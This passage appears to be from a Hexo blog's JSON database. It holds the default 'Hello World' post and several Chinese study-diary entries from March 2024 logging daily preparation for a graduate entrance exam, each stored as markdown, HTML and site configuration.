[Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2022-01-1 00:00:00\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"updated":"2024-04-12T14:06:35.129Z","_id":"cluwd0apb0000fl76fw2h1ovj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Welcome to <a class=\"link\"   href=\"https://hexo.io/\" >Hexo<i class=\"fas fa-external-link-alt\"></i></a>! This is your very first post. Check <a class=\"link\"   href=\"https://hexo.io/docs/\" >documentation<i class=\"fas fa-external-link-alt\"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class=\"link\"   href=\"https://hexo.io/docs/troubleshooting.html\" >troubleshooting<i class=\"fas fa-external-link-alt\"></i></a> or you can ask me on <a class=\"link\"   href=\"https://github.com/hexojs/hexo/issues\" >GitHub<i class=\"fas fa-external-link-alt\"></i></a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/writing.html\" >Writing<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/server.html\" >Server<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/generating.html\" >Generating<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/one-command-deployment.html\" >Deployment<i class=\"fas fa-external-link-alt\"></i></a></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","tags":"/tags || fa-solid fa-tags","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":"朋友们 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"懒惰是程序员第一生产力","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"不知名艺术家","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"excerpt":"","more":"<p>Welcome to <a class=\"link\"   href=\"https://hexo.io/\" >Hexo<i class=\"fas fa-external-link-alt\"></i></a>! This is your very first post. Check <a class=\"link\"   href=\"https://hexo.io/docs/\" >documentation<i class=\"fas fa-external-link-alt\"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class=\"link\"   href=\"https://hexo.io/docs/troubleshooting.html\" >troubleshooting<i class=\"fas fa-external-link-alt\"></i></a> or you can ask me on <a class=\"link\"   href=\"https://github.com/hexojs/hexo/issues\" >GitHub<i class=\"fas fa-external-link-alt\"></i></a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/writing.html\" >Writing<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/server.html\" >Server<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/generating.html\" >Generating<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a class=\"link\"   href=\"https://hexo.io/docs/one-command-deployment.html\" >Deployment<i class=\"fas fa-external-link-alt\"></i></a></p>\n"},{"title":"考研日记03-26","date":"2024-03-26T13:55:14.000Z","excerpt":"记录考研","_content":"# 2024 3 26\n\n## 学习时间\n\n- 4h\n\n## MATH\n\n- 第二讲学完，1000题没做\n\n## ENGLISH\n\n- 仅限于签到，睡觉前背一点单词\n\n## 408\n\n- 数据结构第一章绪论看完网课（时间复杂度题未做）\n\n\n\n## 杂记\n\n整个三月份都没什么心思学习，情感的经历又一次使我失望，不过好在也算是结束了这一段孽缘，我也要开始找回我自己了，或许只有我自己才能拯自己。种一棵树最好的时间是十年前，其次是现在。一切都还来得及，从明天早起开始做起吧，希望能渐入佳境，完成自己的救赎。","source":"_posts/2024_3_26.md","raw":"---\ntitle: 考研日记03-26\ndate: 2024-03-26 21:55:14\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 26\n\n## 学习时间\n\n- 4h\n\n## MATH\n\n- 第二讲学完，1000题没做\n\n## ENGLISH\n\n- 仅限于签到，睡觉前背一点单词\n\n## 408\n\n- 数据结构第一章绪论看完网课（时间复杂度题未做）\n\n\n\n## 杂记\n\n整个三月份都没什么心思学习，情感的经历又一次使我失望，不过好在也算是结束了这一段孽缘，我也要开始找回我自己了，或许只有我自己才能拯自己。种一棵树最好的时间是十年前，其次是现在。一切都还来得及，从明天早起开始做起吧，希望能渐入佳境，完成自己的救赎。","slug":"2024_3_26","published":1,"updated":"2024-04-12T14:13:45.143Z","_id":"cluwn76g70000oa769vu519gf","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-26\"><a href=\"#2024-3-26\" class=\"headerlink\" title=\"2024 3 26\"></a>2024 3 26</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>4h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第二讲学完，1000题没做</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>仅限于签到，睡觉前背一点单词</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>数据结构第一章绪论看完网课（时间复杂度题未做）</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>整个三月份都没什么心思学习，情感的经历又一次使我失望，不过好在也算是结束了这一段孽缘，我也要开始找回我自己了，或许只有我自己才能拯自己。种一棵树最好的时间是十年前，其次是现在。一切都还来得及，从明天早起开始做起吧，希望能渐入佳境，完成自己的救赎。</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":"朋友们 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"懒惰是程序员第一生产力","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"不知名艺术家","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-26\"><a href=\"#2024-3-26\" class=\"headerlink\" title=\"2024 3 26\"></a>2024 3 26</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>4h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第二讲学完，1000题没做</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>仅限于签到，睡觉前背一点单词</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>数据结构第一章绪论看完网课（时间复杂度题未做）</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>整个三月份都没什么心思学习，情感的经历又一次使我失望，不过好在也算是结束了这一段孽缘，我也要开始找回我自己了，或许只有我自己才能拯自己。种一棵树最好的时间是十年前，其次是现在。一切都还来得及，从明天早起开始做起吧，希望能渐入佳境，完成自己的救赎。</p>\n"},{"title":"考研日记03-27","date":"2024-03-27T13:15:34.000Z","excerpt":"记录考研","_content":"# 2024 3 27\n\n## 学习时间\n\n- 5h\n\n## MATH\n\n- 第三讲开了个头，第二讲1000题写完 p63\n\n## ENGLISH\n\n- 记了42个单词，还是太少了，以后每天目标100+\n\n## 408\n\n- 数据结构第一章绪论过完，第16题没怎么弄懂，明天弄一下。\n\n\n\n## 杂记\n\n今天总体来说状态比昨天好一些了，就是午睡时间有点长，从12.30睡到三点，以后还是要控制一下在1h以内。希望状态能越来越好。加油\n\n\n\n择校\n\n可能iie不再是我唯一的选择了，目前待定的选择，上交网安，武大网安，东南网安，南大网安。","source":"_posts/2024_3_27.md","raw":"---\ntitle: 考研日记03-27\ndate: 2024-03-27 21:15:34\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 27\n\n## 学习时间\n\n- 5h\n\n## MATH\n\n- 第三讲开了个头，第二讲1000题写完 p63\n\n## ENGLISH\n\n- 记了42个单词，还是太少了，以后每天目标100+\n\n## 408\n\n- 数据结构第一章绪论过完，第16题没怎么弄懂，明天弄一下。\n\n\n\n## 杂记\n\n今天总体来说状态比昨天好一些了，就是午睡时间有点长，从12.30睡到三点，以后还是要控制一下在1h以内。希望状态能越来越好。加油\n\n\n\n择校\n\n可能iie不再是我唯一的选择了，目前待定的选择，上交网安，武大网安，东南网安，南大网安。","slug":"2024_3_27","published":1,"updated":"2024-04-12T14:13:57.175Z","_id":"cluwn76ge0001oa7631bpcafd","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024 3 27\"></a>2024 3 27</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>5h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第三讲开了个头，第二讲1000题写完 p63</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>记了42个单词，还是太少了，以后每天目标100+</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>数据结构第一章绪论过完，第16题没怎么弄懂，明天弄一下。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天总体来说状态比昨天好一些了，就是午睡时间有点长，从12.30睡到三点，以后还是要控制一下在1h以内。希望状态能越来越好。加油</p>\n<p>择校</p>\n<p>可能iie不再是我唯一的选择了，目前待定的选择，上交网安，武大网安，东南网安，南大网安。</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":"朋友们 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"懒惰是程序员第一生产力","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"不知名艺术家","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024 3 27\"></a>2024 3 27</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>5h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第三讲开了个头，第二讲1000题写完 p63</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>记了42个单词，还是太少了，以后每天目标100+</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>数据结构第一章绪论过完，第16题没怎么弄懂，明天弄一下。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天总体来说状态比昨天好一些了，就是午睡时间有点长，从12.30睡到三点，以后还是要控制一下在1h以内。希望状态能越来越好。加油</p>\n<p>择校</p>\n<p>可能iie不再是我唯一的选择了，目前待定的选择，上交网安，武大网安，东南网安，南大网安。</p>\n"},{"title":"考研日记03-28","date":"2024-03-28T14:13:12.000Z","excerpt":"记录考研","_content":"# 2024 3 28\n\n## 学习时间\n\n- 3h\n\n## MATH\n\n- 第三讲学完，题为做 p67\n\n## ENGLISH\n\n- 复习了20个单词，好懒今天\n\n## 408\n\n- 没复习。\n\n\n\n## 杂记\n\n可能是因为明天就要去吃自助了，今天没什么心思学习","source":"_posts/2024_3_28.md","raw":"---\ntitle: 考研日记03-28\ndate: 2024-03-28 22:13:12\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 28\n\n## 学习时间\n\n- 3h\n\n## MATH\n\n- 第三讲学完，题为做 p67\n\n## ENGLISH\n\n- 复习了20个单词，好懒今天\n\n## 408\n\n- 没复习。\n\n\n\n## 杂记\n\n可能是因为明天就要去吃自助了，今天没什么心思学习","slug":"2024_3_28","published":1,"updated":"2024-04-12T14:14:01.135Z","_id":"cluwn76gh0002oa76f63q14je","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-28\"><a href=\"#2024-3-28\" class=\"headerlink\" title=\"2024 3 28\"></a>2024 3 28</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>3h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第三讲学完，题为做 p67</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>复习了20个单词，好懒今天</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>没复习。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>可能是因为明天就要去吃自助了，今天没什么心思学习</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":"朋友们 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"懒惰是程序员第一生产力","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"不知名艺术家","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-28\"><a href=\"#2024-3-28\" class=\"headerlink\" title=\"2024 3 28\"></a>2024 3 28</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>3h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>第三讲学完，题为做 p67</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>复习了20个单词，好懒今天</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>没复习。</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>可能是因为明天就要去吃自助了，今天没什么心思学习</p>\n"},{"title":"考研日记03-29","date":"2024-03-29T13:12:45.000Z","excerpt":"记录考研","_content":"# 2024 3 29\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 无\n\n## 408\n\n- 无\n\n\n\n## 杂记\n\n今天就当休息日吧，陪朋友去吃了自助","source":"_posts/2024_3_29.md","raw":"---\ntitle: 考研日记03-29\ndate: 2024-03-29 21:12:45\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 29\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 无\n\n## 408\n\n- 无\n\n\n\n## 杂记\n\n今天就当休息日吧，陪朋友去吃了自助","slug":"2024_3_29","published":1,"updated":"2024-04-12T14:14:09.136Z","_id":"cluwn76gj0003oa76gd3sfsek","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"2024-3-29\"><a href=\"#2024-3-29\" class=\"headerlink\" title=\"2024 3 29\"></a>2024 3 29</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天就当休息日吧，陪朋友去吃了自助</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true}},"links":[{"title":"朋友们 1"},{"name":"XPoet","link":"https://xpoet.cn/","description":"懒惰是程序员第一生产力","avatar":"https://cdn.statically.io/gh/XPoet/image-hosting@master/common-use/avatar.jpg"},{"name":"不知名艺术家","link":"https://jinzhanqi.com/","description":"love artist, love code.","avatar":"https://s3.ax1x.com/2020/11/17/DVvkB4.jpg"},"......","......","......"]}},"more":"<h1 id=\"2024-3-29\"><a href=\"#2024-3-29\" class=\"headerlink\" title=\"2024 3 29\"></a>2024 3 29</h1><h2 id=\"学习时间\"><a href=\"#学习时间\" class=\"headerlink\" title=\"学习时间\"></a>学习时间</h2><ul>\n<li>0h</li>\n</ul>\n<h2 id=\"MATH\"><a href=\"#MATH\" class=\"headerlink\" title=\"MATH\"></a>MATH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"ENGLISH\"><a href=\"#ENGLISH\" class=\"headerlink\" title=\"ENGLISH\"></a>ENGLISH</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"408\"><a href=\"#408\" class=\"headerlink\" title=\"408\"></a>408</h2><ul>\n<li>无</li>\n</ul>\n<h2 id=\"杂记\"><a href=\"#杂记\" class=\"headerlink\" title=\"杂记\"></a>杂记</h2><p>今天就当休息日吧，陪朋友去吃了自助</p>\n"},{"title":"考研日记03-30","date":"2024-03-30T14:25:17.000Z","excerpt":"记录考研","_content":"# 2024 3 30\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 无\n\n## 408\n\n- 无\n\n\n\n## 杂记\n\n今天打了一天比赛，初赛第七，感谢队友带飞！![截屏2024-03-30 16.58.55](https://github.com/R3damancy1/picx-images-hosting/raw/master/2024330.5j3zcz40g8.webp)","source":"_posts/2024_3_30.md","raw":"---\ntitle: 考研日记03-30\ndate: 2024-03-30 22:25:17\nexcerpt: 记录考研\ncategories: 考研\n---\n# 2024 3 30\n\n## 学习时间\n\n- 0h\n\n## MATH\n\n- 无\n\n## ENGLISH\n\n- 无\n\n## 408\n\n- 无\n\n\n\n## 杂记\n\n今天打了一天比赛，初赛第七，感谢队友带飞！![截屏2024-03-30 